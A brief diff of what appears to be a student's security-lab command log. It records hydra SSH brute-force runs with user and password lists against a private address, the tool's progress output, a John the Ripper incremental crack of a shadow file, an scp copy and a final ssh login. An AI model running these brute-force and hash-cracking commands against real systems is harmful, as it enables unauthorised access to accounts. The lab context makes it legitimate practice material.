@@ -1,5 +1,4 @@
-scp -r fsi:~/archivos ./Laboratorios/miscelanea ordenada/COSAS HALLADAS/USUARIOS/ftp_surreta
-
+scp -r fsi:~/archivos ./scp
 
 hydra -C usuarios_mismatch.txt ssh://10.0.3.5 -t 9 -w 7.9 -v -o resultados_mismatch.txt -I
 [STATUS] 167.00 tries/min, 167 tries in 00:01h, 2212 to do in 00:14h, 9 active
@@ -19,3 +18,7 @@ hydra -L users.txt -P passwords_internos.txt ssh://10.0.3.5 -t 4 -w 1.2 -v -f -o
 
 
 ../run/john  --incremental shadow_jadrover.txt
+
+
+
+ssh daguirre@10.0.3.5
